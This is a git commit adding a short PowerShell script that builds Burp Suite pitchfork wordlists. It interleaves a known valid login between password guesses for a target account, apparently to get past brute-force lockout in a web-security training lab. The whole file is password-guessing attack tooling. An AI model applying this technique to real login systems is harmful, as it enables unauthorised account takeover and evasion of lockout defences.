955a1b671dc89f78c048b9232658c81dcc02ccb4
DrDoomScroll <8130200+DrDoomScroll@users.noreply.github.com>
2022-04-29 07:37:04 -0700

    Adding burp pitchfork injector

---
+++ Inject-PitchforkListWithValidCredentials.ps1
@@ -0,0 +1,32 @@
+# Inject-PitchforkListWithValidCredentials
+# This works, convert it to a working cmdlet.
+# Make a cmdlet to generate IP lists.
+
+$literalPath = 'C:\Users\rez\Downloads\passwords.txt'
+$list = Get-Content $literalPath
+
+$outputPath = 'C:\Users\rez\Downloads\'
+
+$newUsernameList = @()
+$targetUsername = 'carlos'
+$injectedUsername = 'wiener'
+
+$newPasswordList = @()
+$passwordToInject = 'peter'
+$passwordInjectionInterval = 1
+
+for($i = 0; $i -lt $list.Count; $i++){
+    
+    $newUsernameList += $targetUsername
+    $newPasswordList += $list[$i]
+
+    if($i % $passwordInjectionInterval -eq 0){
+        $newUsernameList += $injectedUsername
+        $newPasswordList += $passwordToInject
+    }
+}
+
+$newUsernameList | Out-File "$($outputPath)modUsernames.txt"
+$newPasswordList | Out-File "$($outputPath)modPasswords.txt"
+
+#
